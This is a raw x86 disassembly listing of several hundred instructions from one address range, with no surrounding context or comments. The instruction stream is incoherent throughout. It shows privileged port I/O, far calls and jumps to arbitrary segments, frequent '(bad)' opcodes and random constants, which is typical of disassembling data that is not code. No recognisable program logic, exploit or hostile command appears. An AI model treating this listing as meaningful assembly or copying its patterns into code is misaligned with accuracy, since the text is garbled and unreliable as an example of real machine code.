  4b0862:	stos   BYTE PTR es:[edi],al
  4b0863:	sub    ebx,edx
  4b0865:	xor    bl,dh
  4b0867:	cmp    eax,0x174258b0
  4b086c:	mov    WORD PTR [esi-0xe],es
  4b086f:	and    eax,0x1d36b045
  4b0874:	jg     0x4b08ae
  4b0876:	add    al,0x77
  4b0878:	push   ss
  4b0879:	and    eax,0x41563252
  4b087e:	shl    BYTE PTR [ebx+0x2b001201],0xd0
  4b0885:	fild   DWORD PTR [esi-0x54]
  4b0888:	jo     0x4b08fa
  4b088a:	loope  0x4b084f
  4b088c:	lods   eax,DWORD PTR ds:[esi]
  4b088d:	dec    ebp
  4b088e:	in     eax,dx
  4b088f:	lahf   
  4b0890:	adc    DWORD PTR [esp+esi*8+0x62],ebx
  4b0894:	ins    BYTE PTR es:[edi],dx
  4b0895:	fs sub al,0x82
  4b0898:	and    al,0x17
  4b089a:	jae    0x4b08f2
  4b089c:	or     eax,0x50a8ac3c
  4b08a1:	inc    ecx
  4b08a2:	and    BYTE PTR [esp+ecx*4],bl
  4b08a5:	gs loope 0x4b0923
  4b08a8:	inc    esp
  4b08a9:	ja     0x4b08ad
  4b08ab:	inc    esi
  4b08ac:	inc    esp
  4b08ad:	jne    0x4b0893
  4b08af:	add    DWORD PTR [edi-0x2e],edx
  4b08b2:	or     eax,0xcbd8f792
  4b08b7:	add    al,al
  4b08b9:	inc    ecx
  4b08ba:	rcl    BYTE PTR [ebp+0x2ad3a8d4],cl
  4b08c0:	jo     0x4b085d
  4b08c2:	xor    dh,al
  4b08c4:	mov    DWORD PTR [ebp+0x72a8aa17],ecx
  4b08ca:	or     eax,0xeaf139c0
  4b08cf:	fidivr DWORD PTR [ebp-0x67d04cdb]
  4b08d5:	dec    ecx
  4b08d6:	test   eax,0x2eeb0af8
  4b08db:	mov    edi,0x103ac140
  4b08e0:	aam    0xd
  4b08e2:	add    BYTE PTR ds:0xef4c5625,bh
  4b08e8:	xchg   edi,eax
  4b08e9:	cmp    ebx,ecx
  4b08eb:	xor    eax,0x9eb4d0f
  4b08f0:	clc    
  4b08f1:	call   0x26fb0f51
  4b08f6:	mov    DWORD PTR ds:0x737c08d5,0xd1ea0b36
  4b0900:	rcr    DWORD PTR [ecx],1
  4b0902:	jmp    0x7ac4f184
  4b0907:	add    DWORD PTR [ecx],edx
  4b0909:	mov    al,0x97
  4b090b:	xchg   ecx,eax
  4b090c:	dec    eax
  4b090d:	xor    eax,ebp
  4b090f:	lahf   
  4b0910:	push   es
  4b0911:	ficomp WORD PTR [eax+ebp*4-0x3e143851]
  4b0918:	add    al,0xec
  4b091a:	and    BYTE PTR [esi+0x23],dh
  4b091d:	mov    al,ds:0x2b256f02
  4b0922:	or     DWORD PTR [eax-0x4d],esp
  4b0925:	int3   
  4b0926:	mov    BYTE PTR gs:[eax-0x1e],ah
  4b092a:	loop   0x4b08b0
  4b092c:	data16 add dl,BYTE PTR [ecx+0x50]
  4b0930:	push   0x948aec02
  4b0935:	sbb    eax,0xab81d634
  4b093a:	jnp    0x4b0942
  4b093c:	xor    dl,BYTE PTR [ebx+0x33]
  4b093f:	adc    edx,DWORD PTR [edx-0x46]
  4b0942:	push   es
  4b0943:	in     eax,0x32
  4b0945:	inc    ebp
  4b0946:	ror    DWORD PTR [edi],1
  4b0948:	rcr    BYTE PTR [edx+0x26],0x85
  4b094c:	mov    ds:0x620d371,al
  4b0951:	cmp    cl,BYTE PTR [edx+0x10]
  4b0954:	sahf   
  4b0955:	inc    esi
  4b0956:	daa    
  4b0957:	sbb    DWORD PTR [eax+0x70e15707],0xffffffb2
  4b095e:	push   es
  4b095f:	hlt    
  4b0960:	call   0xc052:0xe1dd6909
  4b0967:	push   ecx
  4b0968:	out    0x9b,al
  4b096a:	xor    edx,DWORD PTR [ebp+0x2e]
  4b096d:	dec    ebp
  4b096e:	ret    0xdcd8
  4b0971:	push   edx
  4b0972:	push   ss
  4b0973:	mov    al,ds:0xe0ccb036
  4b0978:	es sbb al,0xe4
  4b097b:	and    al,0xb2
  4b097d:	push   cs
  4b097e:	xor    eax,0xef286a59
  4b0983:	shl    DWORD PTR [ecx-0x442e7d7],0xa0
  4b098a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b098b:	push   cs
  4b098c:	sahf   
  4b098d:	lods   al,BYTE PTR ds:[esi]
  4b098e:	addr16 fwait
  4b0990:	add    al,0xa1
  4b0992:	and    ch,al
  4b0994:	inc    ebp
  4b0995:	gs fwait
  4b0997:	ror    BYTE PTR [ebx+0x26],0x12
  4b099b:	sub    dh,BYTE PTR [esi]
  4b099d:	cs mov edx,0xac0f7318
  4b09a3:	push   0xf5a029c8
  4b09a8:	push   ss
  4b09a9:	and    dl,ah
  4b09ab:	push   ebp
  4b09ac:	and    DWORD PTR [esi+0x71c02dc4],edx
  4b09b2:	sub    al,0x91
  4b09b4:	loopne 0x4b0977
  4b09b6:	rol    esi,1
  4b09b8:	dec    ebp
  4b09b9:	(bad)  
  4b09ba:	lss    ecx,FWORD PTR [eax+0x183d605d]
  4b09c1:	test   ah,dh
  4b09c3:	pop    es
  4b09c4:	jne    0x4b09ca
  4b09c6:	dec    ebx
  4b09c7:	ret    
  4b09c8:	dec    eax
  4b09c9:	jle    0x4b0986
  4b09cb:	rcr    ch,cl
  4b09cd:	pop    edi
  4b09cf:	xor    bh,0xac
  4b09d2:	push   ebx
  4b09d3:	cld    
  4b09d4:	adc    al,0x16
  4b09d6:	mov    ah,0x60
  4b09d8:	and    al,0xf5
  4b09da:	repnz push 0xc0299825
  4b09e0:	jb     0x4b09e2
  4b09e2:	(bad)  
  4b09e3:	inc    DWORD PTR [edx-0x18f4e23f]
  4b09e9:	test   BYTE PTR [esi+0x6b],dh
  4b09ec:	jo     0x4b099f
  4b09ee:	adc    BYTE PTR [edi+0x1e],0x37
  4b09f2:	cld    
  4b09f3:	out    dx,al
  4b09f4:	loope  0x4b09aa
  4b09f6:	push   ebp
  4b09f7:	jg     0x4b0979
  4b09f9:	add    bl,BYTE PTR [edx+0x30]
  4b09fc:	test   dh,ah
  4b09fe:	mov    ah,0x66
  4b0a00:	not    DWORD PTR [esi+0x57]
  4b0a03:	xchg   BYTE PTR [eax-0x7f],al
  4b0a06:	cmp    eax,DWORD PTR [ecx-0x7eef930e]
  4b0a0c:	fcmove st,st(0)
  4b0a0e:	ret    
  4b0a0f:	fcmovb st,st(0)
  4b0a11:	dec    edx
  4b0a12:	or     dl,BYTE PTR [ebx+0x3f]
  4b0a15:	and    al,0xd9
  4b0a17:	and    dl,0x57
  4b0a1a:	fnstenv [eax-0x7a3d3ff0]
  4b0a20:	mov    al,ds:0x2895395b
  4b0a25:	mov    ds:0x6dca1cce,eax
  4b0a2a:	mov    ds:0x1af28053,ax
  4b0a30:	(bad)  
  4b0a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b0a32:	mov    ah,0x87
  4b0a34:	adc    DWORD PTR [eax-0x12],0xb4a1cfc
  4b0a3b:	dec    eax
  4b0a3c:	ins    DWORD PTR es:[edi],dx
  4b0a3d:	adc    BYTE PTR [ebx],dl
  4b0a3f:	sbb    BYTE PTR [ebx],dl
  4b0a41:	mov    ss,WORD PTR [ebx-0x4d]
  4b0a44:	cmp    esi,edi
  4b0a46:	adc    bh,BYTE PTR [esi+ebx*2-0x25d6d9b3]
  4b0a4d:	hlt    
  4b0a4e:	hlt    
  4b0a4f:	sub    al,0x75
  4b0a51:	pop    edx
  4b0a52:	clc    
  4b0a53:	or     eax,0x14af0d13
  4b0a58:	retf   
  4b0a59:	enter  0x6765,0x83
  4b0a5d:	lock adc esi,DWORD PTR [ecx+0x14dcfe84]
  4b0a64:	into   
  4b0a65:	or     ebx,DWORD PTR [ecx+0x7b44f20c]
  4b0a6b:	pop    edx
  4b0a6c:	lods   eax,DWORD PTR ds:[esi]
  4b0a6d:	(bad)  
  4b0a6f:	in     eax,0x90
  4b0a71:	inc    esi
  4b0a72:	clc    
  4b0a73:	jg     0x4b0ab5
  4b0a75:	push   esi
  4b0a76:	sbb    edi,DWORD PTR [edx]
  4b0a78:	fiadd  DWORD PTR [eax]
  4b0a7a:	add    eax,0x88ba873
  4b0a7f:	push   edi
  4b0a80:	sbb    eax,0xaf25c9a8
  4b0a85:	cmp    bh,BYTE PTR [edi+ecx*1]
  4b0a88:	mov    al,0xd0
  4b0a8a:	xor    edx,DWORD PTR [eax]
  4b0a8c:	shr    ah,cl
  4b0a8e:	mov    esp,0x8307106f
  4b0a93:	mov    esp,0x6bc0308a
  4b0a98:	sbb    DWORD PTR [eax],0xffffffc7
  4b0a9b:	dec    ebp
  4b0a9c:	in     al,dx
  4b0a9d:	iret   
  4b0a9e:	cs pop ebx
  4b0aa0:	or     eax,0x8cc911b
  4b0aa5:	jbe    0x4b0b05
  4b0aa7:	imul   ebx,DWORD PTR ds:0xc07106d4,0x29
  4b0aae:	cmp    edx,DWORD PTR [esi+0x2ca54f0e]
  4b0ab4:	cld    
  4b0ab5:	lock sar BYTE PTR [ebx],0x38
  4b0ab9:	cmp    eax,0x1c20dae4
  4b0abe:	int3   
  4b0abf:	dec    ebp
  4b0ac0:	int3   
  4b0ac1:	les    eax,FWORD PTR [esi+0x49]
  4b0ac4:	lock es push eax
  4b0ac7:	cmp    edi,DWORD PTR [edx+0x302d9611]
  4b0acd:	sbb    ebp,ecx
  4b0acf:	mov    edx,0x1799a272
  4b0ad4:	dec    edx
  4b0ad5:	sub    DWORD PTR ds:0x820fd40a,edx
  4b0adb:	sbb    al,0xa
  4b0add:	sbb    al,0xc2
  4b0adf:	dec    edx
  4b0ae0:	lods   al,BYTE PTR ds:[esi]
  4b0ae1:	je     0x4b0aec
  4b0ae3:	mov    esp,0x720dd88c
  4b0ae8:	dec    esp
  4b0ae9:	jo     0x4b0a8c
  4b0aeb:	into   
  4b0aec:	mov    cl,0x81
  4b0aee:	aam    0xc9
  4b0af0:	add    al,0xd3
  4b0af2:	and    esp,edx
  4b0af4:	jno    0x4b0af2
  4b0af6:	(bad)  
  4b0af7:	cli    
  4b0af8:	ds push ss
  4b0afa:	push   es
  4b0afb:	jb     0x4b0ab9
  4b0afd:	jne    0x4b0b33
  4b0aff:	adc    DWORD PTR [ecx+0x9],0x71
  4b0b03:	jo     0x4b0af0
  4b0b05:	ins    DWORD PTR es:[edi],dx
  4b0b06:	adc    eax,0x4083400b
  4b0b0b:	sub    DWORD PTR [edi],esp
  4b0b0d:	dec    esp
  4b0b0e:	sbb    al,0x85
  4b0b10:	pop    es
  4b0b11:	pop    edi
  4b0b12:	jge    0x4b0b88
  4b0b14:	push   0x38
  4b0b16:	jne    0x4b0b5c
  4b0b18:	into   
  4b0b19:	mov    DWORD PTR [ebp-0x6168fccc],esi
  4b0b1f:	sbb    al,0x6c
  4b0b21:	lods   al,BYTE PTR ds:[esi]
  4b0b22:	adc    eax,0x6d22820e
  4b0b27:	shr    DWORD PTR [esi+0xc6d3e3f],cl
  4b0b2d:	cmp    BYTE PTR [eax],bl
  4b0b2f:	jmp    0x4b0b48
  4b0b31:	(bad)  
  4b0b32:	jmp    0x4b0b39
  4b0b34:	mov    cl,0x76
  4b0b36:	cwde   
  4b0b37:	pop    edx
  4b0b38:	test   BYTE PTR [ebx+eax*1],bh
  4b0b3b:	xchg   ecx,eax
  4b0b3c:	dec    esp
  4b0b3d:	and    eax,0x10857588
  4b0b42:	test   DWORD PTR ds:0xaf1c7678,ebx
  4b0b48:	xchg   edi,eax
  4b0b49:	sub    BYTE PTR [eax+0x32],0x73
  4b0b4d:	enter  0xc859,0xd1
  4b0b51:	inc    esi
  4b0b52:	out    dx,eax
  4b0b53:	add    BYTE PTR [edi-0x7aefaf71],dh
  4b0b59:	jp     0x4b0bd4
  4b0b5b:	pop    esp
  4b0b5c:	shl    BYTE PTR [eax+0x7b4e1ea6],0xe
  4b0b63:	sbb    ch,BYTE PTR [eax+0x20]
  4b0b66:	or     al,0x9
  4b0b68:	push   edi
  4b0b69:	es in  al,0xb8
  4b0b6c:	(bad)  
  4b0b6d:	daa    
  4b0b6e:	add    ah,BYTE PTR [ebx+0x74573f7a]
  4b0b74:	pop    ebx
  4b0b75:	inc    ecx
  4b0b76:	gs adc al,0x3
  4b0b79:	push   0x6
  4b0b7b:	inc    esi
  4b0b7c:	inc    esp
  4b0b7d:	adc    BYTE PTR [esi],dl
  4b0b7f:	mov    edi,0x4d660e28
  4b0b84:	mov    ebx,0x82ea0bce
  4b0b89:	jle    0x4b0beb
  4b0b8b:	std    
  4b0b8c:	mov    edx,0x78052320
  4b0b91:	xchg   ebx,eax
  4b0b92:	daa    
  4b0b93:	pusha  
  4b0b94:	std    
  4b0b95:	pop    ebp
  4b0b96:	xlat   BYTE PTR ds:[ebx]
  4b0b97:	xchg   ebp,eax
  4b0b98:	jl     0x4b0c0e
  4b0b9a:	imul   edi,DWORD PTR [edi+0x121403],0x182054c9
  4b0ba4:	push   0x58828019
  4b0ba9:	and    DWORD PTR [esi+0x5c226dcb],eax
  4b0baf:	(bad)
  4b0bb2:	pinsrw mm5,WORD PTR ds:0xbbe11ca5,0xf4
  4b0bba:	mov    bl,0x6c
  4b0bbc:	aam    0x90
  4b0bbe:	jo     0x4b0b9b
  4b0bc0:	or     ch,dl
  4b0bc2:	adc    eax,0x2fb41846
  4b0bc7:	sbb    BYTE PTR [ecx],al
  4b0bc9:	sbb    eax,DWORD PTR [ecx+ecx*4-0x123e1b49]
  4b0bd0:	imul   ecx,DWORD PTR [eax+0x1f],0x1e745c90
  4b0bd7:	cwde   
  4b0bd8:	or     al,0x17
  4b0bda:	sub    eax,0xbbed3bdc
  4b0bdf:	sub    BYTE PTR [ebx+edi*1+0x6813fe8b],dh
  4b0be6:	scas   al,BYTE PTR es:[edi]
  4b0be7:	inc    ebp
  4b0be8:	xor    eax,0x50dabec2
  4b0bed:	jle    0x4b0b93
  4b0bef:	outs   dx,DWORD PTR ds:[esi]
  4b0bf0:	sub    DWORD PTR ds:0x15631194,ecx
  4b0bf6:	ds bound esi,QWORD PTR fs:[ebp-0x3c]
  4b0bfb:	inc    edi
  4b0bfc:	mov    bh,0x44
  4b0bfe:	mov    WORD PTR [ebx-0x4bcf4006],es
  4b0c04:	pop    ds
  4b0c05:	les    ebx,FWORD PTR [ebx]
  4b0c07:	shl    BYTE PTR [ebx+0x12bec4bc],1
  4b0c0d:	pop    ecx
  4b0c0e:	pop    eax
  4b0c0f:	retf   
  4b0c10:	enter  0x69d0,0x6
  4b0c14:	mov    ds:0x2b23c248,eax
  4b0c19:	mov    cl,al
  4b0c1b:	push   ebx
  4b0c1c:	cli    
  4b0c1d:	sub    eax,0xc328e497
  4b0c22:	ss xchg ecx,edx
  4b0c25:	stos   DWORD PTR es:[edi],eax
  4b0c26:	sub    BYTE PTR ds:0x6c7d2320,0xe1
  4b0c2d:	add    BYTE PTR [ecx-0x51],ah
  4b0c30:	aam    0x6b
  4b0c32:	push   0x5b0da019
  4b0c37:	jns    0x4b0c9c
  4b0c39:	sbb    bh,BYTE PTR [edx]
  4b0c3b:	jo     0x4b0c72
  4b0c3d:	test   BYTE PTR [edi+0x53],al
  4b0c40:	cmp    BYTE PTR ds:0x462c3b56,dl
  4b0c46:	or     al,0x9e
  4b0c48:	pushf  
  4b0c49:	pop    esi
  4b0c4a:	xchg   esi,eax
  4b0c4b:	xor    cl,BYTE PTR [eax-0x1b]
  4b0c4e:	mov    esi,0x16b58602
  4b0c53:	lea    esi,[edi+ecx*2+0x25]
  4b0c57:	or     eax,0xc907ac15
  4b0c5c:	shl    DWORD PTR [ecx+ebp*4+0x78],1
  4b0c60:	pop    es
  4b0c61:	retf   
  4b0c62:	(bad)  
  4b0c63:	mov    esp,0x479c785f
  4b0c68:	mov    edi,0xfc504d94
  4b0c6d:	daa    
  4b0c6e:	rcl    esi,cl
  4b0c70:	or     esi,DWORD PTR [edx+0x7b]
  4b0c73:	inc    edx
  4b0c74:	xchg   dh,dl
  4b0c76:	popf   
  4b0c77:	ins    BYTE PTR es:[edi],dx
  4b0c78:	in     al,0xf
  4b0c7a:	aam    0x55
  4b0c7c:	test   BYTE PTR [ebx+0x3a9141c0],cl
  4b0c82:	rol    ah,0xa3
  4b0c85:	sbb    al,0x48
  4b0c87:	push   ebx
  4b0c88:	mov    ch,0xf7
  4b0c8a:	xchg   DWORD PTR [eax-0x42],esp
  4b0c8d:	add    BYTE PTR [ecx-0x1bdd76f4],ah
  4b0c93:	in     eax,dx
  4b0c94:	inc    esi
  4b0c95:	or     BYTE PTR fs:[ebx-0x51ebd95f],dh
  4b0c9c:	in     al,0x4a
  4b0c9e:	scas   al,BYTE PTR es:[edi]
  4b0c9f:	and    BYTE PTR [eax],dh
  4b0ca1:	inc    eax
  4b0ca2:	dec    edx
  4b0ca3:	scas   al,BYTE PTR es:[edi]
  4b0ca4:	in     al,0x4a
  4b0ca6:	dec    esp
  4b0ca7:	pusha  
  4b0ca8:	in     al,0x4a
  4b0caa:	scas   al,BYTE PTR es:[edi]
  4b0cab:	in     al,0x74
  4b0cad:	jl     0x4b0c3b
  4b0caf:	scas   eax,DWORD PTR es:[edi]
  4b0cb0:	in     al,0x4a
  4b0cb2:	scas   al,BYTE PTR es:[edi]
  4b0cb3:	cwde   
  4b0cb4:	test   al,0xa4
  4b0cb6:	lods   al,BYTE PTR ds:[esi]
  4b0cb7:	fild   DWORD PTR [eax+0x23]
  4b0cba:	and    esi,esp
  4b0cbc:	add    BYTE PTR [esi+eax*1],bl
  4b0cbf:	iret   
  4b0cc0:	repz cmp al,0xcf
  4b0cc3:	xor    BYTE PTR [eax+ebx*2-0x80],al
  4b0cc7:	xchg   esp,eax
  4b0cc8:	test   al,0x3a
  4b0cca:	iret   
  4b0ccb:	repz cmp al,0xbc
  4b0cce:	shl    ah,1
  4b0cd0:	ins    BYTE PTR es:[edi],dx
  4b0cd1:	mov    edx,0xf9cc4e4a
  4b0cd6:	adc    DWORD PTR [edi-0x3ab77aaf],esp
  4b0cdc:	or     edx,eax
  4b0cde:	test   ah,cl
  4b0ce0:	aas    
  4b0ce1:	push   eax
  4b0ce2:	jecxz  0x4b0d5e
  4b0ce4:	jne    0x4b0d3d
  4b0ce6:	pop    ebp
  4b0ce7:	les    edx,FWORD PTR [ecx+eax*8+0x3c72df88]
  4b0cee:	adc    BYTE PTR [eax],ch
  4b0cf0:	cld    
  4b0cf1:	and    BYTE PTR [edi+0x18ac693c],0x93
  4b0cf8:	inc    ecx
  4b0cf9:	dec    ebx
  4b0cfa:	sbb    dh,BYTE PTR [esi]
  4b0cfc:	sbb    BYTE PTR [esi],0x8a
  4b0cff:	das    
  4b0d00:	push   eax
  4b0d01:	jmp    0xe572f4c
  4b0d06:	lahf   
  4b0d07:	mov    ah,0xe
  4b0d09:	call   0x9d52a7f3
  4b0d0e:	lahf   
  4b0d0f:	dec    ebp
  4b0d10:	ret    0x3588
  4b0d13:	xchg   DWORD PTR [esi-0x5c432ebf],ebx
  4b0d19:	or     esp,DWORD PTR [ecx+0x71]
  4b0d1c:	sub    ebx,DWORD PTR [ecx]
  4b0d1e:	aam    0xea
  4b0d20:	imul   eax,DWORD PTR [eax],0xe12d2795
  4b0d26:	daa    
  4b0d27:	xchg   BYTE PTR [ebx+ebx*2],cl
  4b0d2a:	adc    al,0xf5
  4b0d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b0d2d:	jl     0x4b0cba
  4b0d2f:	xchg   ebp,eax
  4b0d30:	sub    eax,0x2f7d9b67
  4b0d35:	add    ebp,ebp
  4b0d37:	ret    
  4b0d38:	mov    edx,0xd10dc491
  4b0d3d:	mov    edi,0x577009c4
  4b0d42:	ror    DWORD PTR [esi-0x4707e988],cl
  4b0d48:	ror    DWORD PTR [ebp-0x5e],cl
  4b0d4b:	les    esp,FWORD PTR [edx]
  4b0d4d:	icebp  
  4b0d4e:	bound  edx,QWORD PTR [eax]
  4b0d50:	imul   ecx
  4b0d52:	jle    0x4b0dcf
  4b0d54:	ins    DWORD PTR es:[edi],dx
  4b0d55:	mov    ds:0xf6a46b85,eax
  4b0d5a:	sub    ecx,eax
  4b0d5c:	ins    BYTE PTR es:[edi],dx
  4b0d5d:	or     al,0x32
  4b0d5f:	test   BYTE PTR [ecx],ch
  4b0d61:	sub    al,0x8f
  4b0d63:	push   0x2
  4b0d65:	xchg   edi,esi
  4b0d67:	jbe    0x4b0d5c
  4b0d69:	mov    ebp,0x23c716f8
  4b0d6e:	mov    bh,0x54
  4b0d70:	sub    BYTE PTR [ecx],0xac
  4b0d73:	xchg   edi,eax
  4b0d74:	lods   al,BYTE PTR ds:[esi]
  4b0d75:	jle    0x4b0db1
  4b0d77:	and    eax,0xa7337857
  4b0d7c:	mov    al,ds:0x29289491
  4b0d81:	aam    0xc6
  4b0d83:	mov    al,0x9a
  4b0d85:	add    BYTE PTR [ebx+0x5],ah
  4b0d88:	(bad)  
  4b0d89:	push   0x25
  4b0d8b:	or     cl,cl
  4b0d8d:	int    0xf9
  4b0d8f:	push   0xffffffc0
  4b0d91:	mov    ds:0x56042b51,al
  4b0d96:	add    al,BYTE PTR [eax]
  4b0d98:	popf   
  4b0d99:	inc    eax
  4b0d9a:	sub    dl,BYTE PTR [ecx-0x1c]
  4b0d9d:	sub    DWORD PTR [eax-0x60],edi
  4b0da0:	push   esp
  4b0da1:	sub    BYTE PTR [eax],bh
  4b0da3:	jg     0x4b0d32
  4b0da5:	dec    ebp
  4b0da6:	lock mov eax,0x92c1012a
  4b0dac:	leave  
  4b0dad:	xor    dh,bl
  4b0daf:	mov    al,0xb0
  4b0db1:	sbb    DWORD PTR [ebx-0x7c],ebp
  4b0db4:	rol    BYTE PTR cs:[eax],0x81
  4b0db8:	xchg   edx,eax
  4b0db9:	jmp    0x503a:0x4ccb0bf
  4b0dc0:	neg    dh
  4b0dc2:	rol    esi,cl
  4b0dc4:	icebp  
  4b0dc5:	jp     0x4b0e11
  4b0dc7:	sbb    BYTE PTR [edx],ah
  4b0dc9:	cmp    al,0xdc
  4b0dcb:	sbb    BYTE PTR [edx-0x79caf6d9],dh
  4b0dd1:	jbe    0x4b0e1c
  4b0dd3:	retf   0x13b1
  4b0dd6:	int3   
  4b0dd7:	cmp    al,0x4c
  4b0dd9:	(bad)  
  4b0dda:	dec    edi
  4b0ddb:	in     al,0x9e
  4b0ddd:	ins    BYTE PTR es:[edi],dx
  4b0dde:	je     0x4b0deb
  4b0de0:	jle    0x4b0dec
  4b0de2:	outs   dx,BYTE PTR ds:[esi]
  4b0de3:	fild   DWORD PTR [eax+0xd]
  4b0de6:	sub    ah,BYTE PTR [ecx+0x1a6496b9]
  4b0dec:	mov    BYTE PTR [ebx+0x33],ch
  4b0def:	lds    edx,FWORD PTR [edx]
  4b0df1:	rol    al,1
  4b0df3:	or     al,dl
  4b0df5:	stos   DWORD PTR es:[edi],eax
  4b0df6:	sbb    BYTE PTR [ebx-0x4deec3e8],0xfc
  4b0dfd:	or     BYTE PTR [esi-0x1cb442fb],cl
  4b0e03:	dec    ecx
  4b0e04:	scas   al,BYTE PTR es:[edi]
  4b0e05:	clc    
  4b0e06:	sbb    ch,BYTE PTR [ecx-0x2e]
  4b0e09:	mov    ch,0x14
  4b0e0b:	add    dh,bh
  4b0e0d:	rcl    al,1
  4b0e0f:	sti    
  4b0e10:	push   ecx
  4b0e11:	add    WORD PTR [esi+esi*1+0xd681176],dx
  4b0e19:	mov    esi,eax
  4b0e1b:	inc    ebx
  4b0e1c:	sbb    ah,0xa2
  4b0e1f:	push   ebp
  4b0e20:	and    dl,BYTE PTR [esi]
  4b0e22:	ror    DWORD PTR [eax*1+0x4f84aa72],1
  4b0e29:	lea    ecx,[eax+0x75914657]
  4b0e2f:	stos   DWORD PTR es:[edi],eax
  4b0e30:	ins    BYTE PTR es:[edi],dx
  4b0e31:	retf   0x83c
  4b0e34:	jb     0x4b0e96
  4b0e36:	std    
  4b0e37:	js     0x4b0e67
  4b0e39:	leave  
  4b0e3a:	cmp    BYTE PTR [edx],ch
  4b0e3c:	stos   DWORD PTR es:[edi],eax
  4b0e3d:	push   eax
  4b0e3e:	cmp    eax,0xf43b4324
  4b0e43:	add    eax,0xd9d82a78
  4b0e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b0e49:	add    ebp,DWORD PTR [edx+0x12ddf14d]
  4b0e4f:	out    dx,al
  4b0e50:	cdq    
  4b0e51:	sahf   
  4b0e52:	outs   dx,BYTE PTR ds:[esi]
  4b0e53:	popa   
  4b0e54:	adc    BYTE PTR [eax-0x65],dl
  4b0e57:	cmp    al,BYTE PTR [edx]
  4b0e59:	jo     0x4b0e73
  4b0e5b:	clc    
  4b0e5c:	loopne 0x4b0e37
  4b0e5e:	ins    DWORD PTR es:[edi],dx
  4b0e5f:	hlt    
  4b0e60:	ffreep st(4)
  4b0e62:	dec    edi
  4b0e63:	mov    ds:0x98f27a80,al
  4b0e68:	push   esi
  4b0e69:	loopne 0x4b0e00
  4b0e6b:	pop    eax
  4b0e6c:	sub    ch,dl
  4b0e6e:	add    al,0x2c
  4b0e70:	add    eax,0x72
  4b0e73:	add    eax,0x81753722
  4b0e78:	adc    BYTE PTR [esi+0x52],dl
  4b0e7b:	push   ebx
  4b0e7c:	and    eax,0xae185603
  4b0e81:	pop    es
  4b0e82:	loopne 0x4b0e7c
  4b0e84:	or     edx,edi
  4b0e86:	push   ebx
  4b0e87:	xor    eax,0x67d03498
  4b0e8c:	push   ebx
  4b0e8d:	test   al,0x82
  4b0e8f:	adc    eax,DWORD PTR [ebp-0x67]
  4b0e92:	add    esi,edi
  4b0e94:	push   ds
  4b0e95:	test   BYTE PTR [edx],dh
  4b0e97:	cwde   
  4b0e98:	cmp    eax,0x73e8226f
  4b0e9d:	push   ebp
  4b0e9e:	adc    BYTE PTR [eax],cl
  4b0ea0:	das    
  4b0ea1:	push   cs
  4b0ea2:	adc    al,0x10
  4b0ea4:	dec    ebp
  4b0ea5:	fidiv  DWORD PTR [ecx+0x347b5253]
  4b0eab:	push   0x3f
  4b0ead:	pop    ebp
  4b0eae:	xchg   ecx,eax
  4b0eaf:	sbb    BYTE PTR [edi+esi*8-0x7db5cb4a],0xdd
  4b0eb7:	xor    DWORD PTR [ebp+0x67],eax
  4b0eba:	je     0x4b0e72
  4b0ebc:	jno    0x4b0e5d
  4b0ebe:	xchg   BYTE PTR ds:0x2aaa1278,ah
  4b0ec4:	ror    DWORD PTR [ebp+eax*2+0x576fa868],cl
  4b0ecb:	xor    BYTE PTR [ecx+0x190374a],ah
  4b0ed1:	push   ecx
  4b0ed2:	xor    cl,BYTE PTR [ecx-0x5b]
  4b0ed5:	mov    dh,0x22
  4b0ed7:	lods   eax,DWORD PTR ds:[esi]
  4b0ed8:	mov    fs,WORD PTR [ecx+0x2e]
  4b0edb:	sub    BYTE PTR [ebp-0x62],ah
  4b0ede:	shr    BYTE PTR [edi+0x7603ff94],0x14
  4b0ee5:	iret   
  4b0ee6:	cmp    esi,esi
  4b0ee8:	jp     0x4b0ed9
  4b0eea:	out    0x2c,eax
  4b0eec:	lods   al,BYTE PTR ds:[esi]
  4b0eed:	jmp    0x4b0efa
  4b0eef:	(bad)  
  4b0ef0:	adc    DWORD PTR [ecx],eax
  4b0ef2:	shl    BYTE PTR [ebp+ebx*2-0x3afff275],0x67
  4b0efa:	jg     0x4b0ea8
  4b0efc:	or     DWORD PTR [eax],ecx
  4b0efe:	mov    eax,ds:0x33776420
  4b0f03:	aad    0xff
  4b0f05:	adc    BYTE PTR [ecx-0x42],ah
  4b0f08:	jg     0x4b0ec2
  4b0f0a:	pop    ds
  4b0f0b:	test   ebx,ebp
  4b0f0d:	push   ecx
  4b0f0e:	popf   
  4b0f0f:	adc    esi,esp
  4b0f11:	shl    BYTE PTR [ebp+eax*1+0x74ec2aee],1
  4b0f18:	jmp    0x9888:0xd951f504
  4b0f1f:	inc    esi
  4b0f20:	loopne 0x4b0efa
  4b0f22:	add    BYTE PTR [ecx],ch
  4b0f24:	sbb    esi,esi
  4b0f26:	test   eax,0x5b5e006d
  4b0f2b:	scas   eax,DWORD PTR es:[edi]
  4b0f2c:	data16 outs dx,BYTE PTR ds:[esi]
  4b0f2e:	mov    ds:0xf435c588,al
  4b0f33:	push   ds
  4b0f34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b0f35:	(bad)  
  4b0f36:	out    dx,eax
  4b0f37:	loop   0x4b0ebc
  4b0f39:	and    bl,BYTE PTR [edi-0x60]
  4b0f3c:	lods   al,BYTE PTR ds:[esi]
  4b0f3d:	push   ss
  4b0f3e:	add    esi,edx
  4b0f40:	pushf  
  4b0f41:	cmp    al,0x27
  4b0f43:	mov    al,0x8b
  4b0f45:	mov    ah,0x1
  4b0f47:	daa    
  4b0f48:	iret   
  4b0f49:	leave  
  4b0f4a:	jae    0x4b0f04
  4b0f4c:	cmp    DWORD PTR [eax+ecx*4-0x630d8c40],0x86c4803c
  4b0f57:	enter  0x273c,0xcf
  4b0f5b:	leave  
  4b0f5c:	or     esp,0xffffff85
  4b0f5f:	rol    BYTE PTR [edx-0x630d8c37],1
  4b0f65:	aam    0x84
  4b0f67:	fadd   DWORD PTR [esp+ebx*4]
  4b0f6a:	cmp    al,0x27
  4b0f6c:	iret   
  4b0f6d:	fadd   QWORD PTR [edx]
  4b0f6f:	loopne 0x4b0efa
  4b0f71:	in     al,0x88
  4b0f73:	add    DWORD PTR [ecx+0x65],esi
  4b0f76:	xchg   edx,eax
  4b0f77:	call   0x3543190e
  4b0f7c:	or     dh,BYTE PTR [esi]
  4b0f7e:	adc    al,0x89
  4b0f80:	jp     0x4b0f9a
  4b0f82:	ret    
